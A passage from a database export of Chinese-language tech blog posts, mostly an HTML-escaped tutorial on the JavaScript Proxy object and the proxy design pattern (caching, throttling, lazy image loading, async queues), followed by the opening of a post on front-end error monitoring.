class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e target = {};\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e handler = {\n  \u003cspan class=\"hljs-attr\"\u003eset\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eobj, prop, value\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    obj[prop] = \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e * value;\n  },\n  \u003cspan class=\"hljs-attr\"\u003eget\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eobj, prop\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e obj[prop] * \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n  }\n};\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e p = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(target, handler);\n\np.x = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;          \u003cspan class=\"hljs-comment\"\u003e// 使用了 set 方法\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(p.x); \u003cspan class=\"hljs-comment\"\u003e// 4, 使用了 get 方法\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代理一个数组：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e p = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(\n  [\u003cspan class=\"hljs-string\"\u003e'Adela'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'Melyna'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'Lesley'\u003c/span\u003e],\n  {\n    \u003cspan class=\"hljs-attr\"\u003eget\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eobj, prop\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (prop === \u003cspan class=\"hljs-string\"\u003e'length'\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e`Length is \u003cspan class=\"hljs-subst\"\u003e${obj[prop]}\u003c/span\u003e.`\u003c/span\u003e;\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e`Hello, \u003cspan class=\"hljs-subst\"\u003e${obj[prop]}\u003c/span\u003e!`\u003c/span\u003e;\n    }\n  }\n);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(p.length) \u003cspan class=\"hljs-comment\"\u003e// Length is 3.\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(p[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]); \u003cspan class=\"hljs-comment\"\u003e// Hello, Adela\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(p[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e]); \u003cspan class=\"hljs-comment\"\u003e// Hello, Melyna\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(p[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e]); \u003cspan class=\"hljs-comment\"\u003e// Hello, Lesley\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代理一个普通函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e foo = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, b, c\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e a + b + c;\n}\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e pFoo = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(foo, {\n  \u003cspan class=\"hljs-attr\"\u003eapply\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003etarget, that, args\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e grow = args.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ex\u003c/span\u003e =\u0026gt;\u003c/span\u003e x * \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e inter = \u003cspan class=\"hljs-built_in\"\u003eReflect\u003c/span\u003e.apply(target, that, grow);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e inter * \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e;\n  }\n});\n\npFoo(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e);   \u003cspan class=\"hljs-comment\"\u003e// 36, (1 * 2  + 2 * 2 + 3 * 2) * 3  \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代理构造函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eBar\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(x) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.x = x;\n  }\n  say() {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e`Hello, x = \u003cspan class=\"hljs-subst\"\u003e${\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.x}\u003c/span\u003e`\u003c/span\u003e);\n  }\n}\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e PBar = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(Bar, {\n  \u003cspan class=\"hljs-attr\"\u003econstruct\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003etarget, args\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e obj = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Bar(args[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] * \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e obj;\n  }\n});\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e p = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e PBar(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\np.say(); \u003cspan class=\"hljs-comment\"\u003e// Hello, x = 2\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eProxy\u003c/code\u003e 的基本用法无出其上，可 \u003ccode\u003eProxy\u003c/code\u003e 的真正用途还没有显现出来，接下来结合设计模式中的一种模式 —— 代理模式 —— 进一步讨论。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e使用 Proxy 创建代理模式\u003c/h2\u003e\n\u003cp\u003e从上面的例子并不能看出 \u003ccode\u003eProxy\u003c/code\u003e 给我们带来了什么便利，需要实现的功能完全可以在原函数内部进行实现。既然如此，使用代理模式的意义是什么呢？\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e遵循“单一职责原则”，面向对象设计中鼓励将不同的职责分布到细粒度的对象中，\u003ccode\u003eProxy\u003c/code\u003e 在原对象的基础上进行了功能的衍生而又不影响原对象，符合松耦合高内聚的设计理念\u003c/li\u003e\n\u003cli\u003e遵循“开放-封闭原则”，代理可以随时从程序中去掉，而不用对其他部分的代码进行修改，在实际场景中，随着版本的迭代可能会有多种原因不再需要代理，那么就可以容易的将代理对象换成原对象的调用\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e达到上述两个原则有一个前提就是代理必须符合“代理和本体接口一致性”原则：代理和原对象的输入和输出必须是一致的。这样对于用户来说，代理就是透明的，代理和原对象在不改动其他代码的条件下是可以被相互替换的。\u003c/p\u003e\n\u003cp\u003e代理模式的用途很广泛，这里我们看一个缓存代理的例子。\u003c/p\u003e\n\u003cp\u003e首先创建一个 \u003ccode\u003eProxy\u003c/code\u003e 的包装函数，该函数接受需要创建代理的目标函数为第一个参数，以缓存的初值为第二个参数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e createCacheProxy = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003efn, cache = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMap\u003c/span\u003e(\u003c/span\u003e)) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(fn, {\n    apply(target, context, args) {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e argsProp = args.join(\u003cspan class=\"hljs-string\"\u003e' '\u003c/span\u003e);\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (cache.has(argsProp)) {\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Using old data...'\u003c/span\u003e);\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e cache.get(argsProp);\n      }\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = fn(...args);\n      cache.set(argsProp, result);\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result;\n    }\n  });\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后我们使用乘法函数 \u003ccode\u003emult\u003c/code\u003e 去创建代理并调用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e mult = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003e...args\u003c/span\u003e) =\u0026gt;\u003c/span\u003e args.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a * b);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e multProxy = createCacheProxy(mult);\n\nmultProxy(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e);  \u003cspan class=\"hljs-comment\"\u003e// 24\u003c/span\u003e\nmultProxy(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e);  \u003cspan class=\"hljs-comment\"\u003e// 24, 输出 Using old data\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e也可以使用其他的函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e squareAddtion = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003e...args\u003c/span\u003e) =\u0026gt;\u003c/span\u003e args.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a + b ** \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e squareAddtionProxy = createCacheProxy(squareAddtion);\n\nsquareAddtionProxy(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e);  \u003cspan class=\"hljs-comment\"\u003e// 29\u003c/span\u003e\nsquareAddtionProxy(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e);  \u003cspan class=\"hljs-comment\"\u003e// 29, 输出 Using old data\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对于上面这个例子，有三点需要注意：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e对于检测是否存在旧值的过程较为粗暴，实际应用中应考虑是否应该使用更为复杂精确的判断方法，需要结合实际进行权衡；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecreateCacheProxy\u003c/code\u003e 中的 \u003ccode\u003econsole.log\u003c/code\u003e 违背了前文所说的“代理和本体接口一致性”原则，只是为了开发环境更加方便性的调试，生产环境中必须去掉；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emultProxy\u003c/code\u003e 与 \u003ccode\u003esquareAdditionProxy\u003c/code\u003e 是为了演示使用方法而在这里使用了相对简单的算法和小数据量，但在实际应用中数据量越大、 \u003ccode\u003efn\u003c/code\u003e 的计算过程越复杂，优化效果越好，否则，优化效果不仅有可能不明显反而会造成性能下降\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e代理模式的实际应用\u003c/h2\u003e\n\u003cp\u003e这一节结合几个具体的例子来加深对代理模式的理解。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e函数节流\u003c/h3\u003e\n\u003cp\u003e如果想要控制函数调用的频率，可以使用代理进行控制：\u003c/p\u003e\n\u003cp\u003e需要实现的基本功能：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e handler = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Do something...'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.addEventListener(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e, handler);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来使用 \u003ccode\u003eProxy\u003c/code\u003e 进行节流。\u003c/p\u003e\n\u003cp\u003e首先使用构造创建代理函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e createThrottleProxy = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003efn, rate\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e lastClick = \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() - rate;\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(fn, {\n    apply(target, context, args) {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() - lastClick \u0026gt;= rate) {\n        fn(args);\n        lastClick = \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now();\n      }\n    }\n  });\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后只需要将原有的事件处理函数进行一曾包装即可：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e handler = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Do something...'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e handlerProxy = createThrottleProxy(handler, \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.addEventListener(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e, handlerProxy);\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e在生产环境中已有多种工具库实现该功能，不需要我们自己编写\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e图片懒加载\u003c/h3\u003e\n\u003cp\u003e某些时候需要延迟加载图片，尤其要考虑网络环境恶劣以及比较重视流量的情况。这个时候可以使用一个虚拟代理进行延迟加载。\u003c/p\u003e\n\u003cp\u003e首先是我们最原始的代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e img = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Image();\nimg.src = \u003cspan class=\"hljs-string\"\u003e'/some/big/size/image.jpg'\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.body.appendChild(img);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为了实现懒加载，创建虚拟图片节点 \u003ccode\u003evirtualImg\u003c/code\u003e 并构造创建代理函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e createImgProxy = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eimg, loadingImg, realImg\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e hasLoaded = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e virtualImg = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Image();\n  virtualImg.src = realImg;\n  virtualImg.onload = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003eReflect\u003c/span\u003e.set(img, \u003cspan class=\"hljs-string\"\u003e'src'\u003c/span\u003e, realImg);\n    hasLoaded = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n  }\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(img, {\n    get(obj, prop) {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (prop === \u003cspan class=\"hljs-string\"\u003e'src'\u003c/span\u003e \u0026amp;\u0026amp; !hasLoaded) {\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e loadingImg;\n      }\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e obj[prop];\n    }\n  });\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后是将原始的图片节点替换为代理图片进行调用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e img = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Image();\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e imgProxy = createImgProxy(img, \u003cspan class=\"hljs-string\"\u003e'/loading.gif'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'/some/big/size/img.jpg'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.body.appendChild(imgProxy);\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e异步队列\u003c/h3\u003e\n\u003cp\u003e这个需求是很常见的：前一个异步操作结束后再进行下一个异步操作。这部分我使用 \u003ccode\u003ePromise\u003c/code\u003e 进行实现。\u003c/p\u003e\n\u003cp\u003e首先构造一个最为简单的异步操作 \u003ccode\u003easyncFunc\u003c/code\u003e ：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e callback = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Do something...'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e asyncFunc = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ecb\u003c/span\u003e) =\u0026gt;\u003c/span\u003e setTimeout(cb, \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e);\n\nasyncFunc(callback);\nasyncFunc(callback);\nasyncFunc(callback);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以看到控制台的输出是 1s 之后，几乎是同时输出三个结果：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// .. 1s later ..\nDo something...\nDo something...\nDo something...\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来我们使用 \u003ccode\u003ePromise\u003c/code\u003e 实现异步队列：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e createAsyncQueueProxy = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003easyncFunc\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e promise = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(asyncFunc, {\n    apply(target, context, [cb, ...args]) {\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e result = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n      promise = \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e\n        .resolve(promise)\n        .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresolve\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n          result = \u003cspan class=\"hljs-built_in\"\u003eReflect\u003c/span\u003e.apply(asyncFunc, \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, [\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n            cb();\n            resolve();\n          }, ...args]);\n        }));\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result;\n    }\n  });\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面这段代码通过 \u003ccode\u003ePromise\u003c/code\u003e 实现了异步函数队列，建议在理解了 \u003ccode\u003ePromise\u003c/code\u003e 之后再理解阅读上面这段代码。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e上面这段代码测试通过，有两点需要注意：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003epromise\u003c/code\u003e 的值并不能确定是否为 \u003ccode\u003ePromise\u003c/code\u003e ，需要使用 \u003ccode\u003ePromise.resolve\u003c/code\u003e 方法之后才能使用 \u003ccode\u003ethen\u003c/code\u003e 方法\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eReflect.apply\u003c/code\u003e 方法中的第三个参数是数组，形同与 \u003ccode\u003eFunction.prototype.apply\u003c/code\u003e 的第二个参数\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e然后使用代理进行替换并调用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e timeoutProxy = createAsyncQueueProxy(asynFunc);\n\ntimeoutProxy(callback);\ntimeoutProxy(callback);\ntimeoutProxy(callback);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以看到控制台的输出已经像我们期望的那样： 前一个异步操作执行完毕之后才会进行下一个异步操作。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// .. 1s later ..\nDo something...\n// .. 1s later ..\nDo something...\n// .. 1s later ..\nDo something...\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e除了上面这种使用代理的方式实现异步队列外，在我的另一篇博客\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a31d4b66fb9a045211eb727\"\u003e进阶 Javascript 生成器\u003c/a\u003e中，还使用了另外一种方式。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e结语\u003c/h2\u003e\n\u003cp\u003e本文首先介绍了 ES2015 中关于 \u003ccode\u003eProxy\u003c/code\u003e 的基本用法，接着讨论了代理模式的使用特点，然后结合实际列举了几种常见的使用场景。最后列举一些比较有价值的参考资料供感兴趣的开发者继续阅读。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e参考资料\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://www.dofactory.com/javascript/proxy-design-pattern\"\u003eJavascript Proxy Design Pattern\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://book.douban.com/subject/26382780/\"\u003eJavaScript设计模式与开发实践 - 曾探\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://www.joezimjs.com/javascript/javascript-design-patterns-proxy/\"\u003eJavaScript Design Patterns: Proxy\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","buildTime":"1514973706.8752","__v":0}
{"_id":{"$oid":"5a4e178e201569114874c00c"},"id":"5a3dca226fb9a04515441686","author":{"$oid":"5a4e178e201569114874bff4"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/23/1608160e56d5d23e?w=700\u0026h=485\u0026f=png\u0026s=38011"],"screenShot":null}],"title":"从无到有\u003c前端异常监控系统\u003e落地","meta":{"likeCount":0},"tag":[],"comment":[],"shortContent":"有一天一个测试同事的一个移动端页面白屏了，看样子是页面哪里报错了。 我自己打开页面并没有报错，最后发现报错只存在于他的手机，移动端项目又是在微信环境下，调试起来会比较麻烦，最后用他手机调试才发现问题： 是他账户下面有个对话的消息数据有问题导致页面报错了。 一般遇到这种情况只有用…","content":"\u003ch2\u003e\u003cstrong\u003e\u003cspan style=\"color: #800000;\"\u003e导火索\u003c/span\u003e\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e  有一天一个测试同事的一个移动端页面白屏了，看样子是页面哪里报错了。\u0026nbsp; 我自己打开页面并没有报错，最后发现报错只存在于他的手机，移动端项目又是在微信环境下，调试起来会比较麻烦，最后用他手机调试才发现问题： 是他账户下面有个对话的消息数据有问题导致页面报错了。\u0026nbsp; 一般遇到这种情况只有用他的手机或者账户调试能很快查到问题，如果是外部的用户怎么办，我没法拿他的手机去测试。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"\" 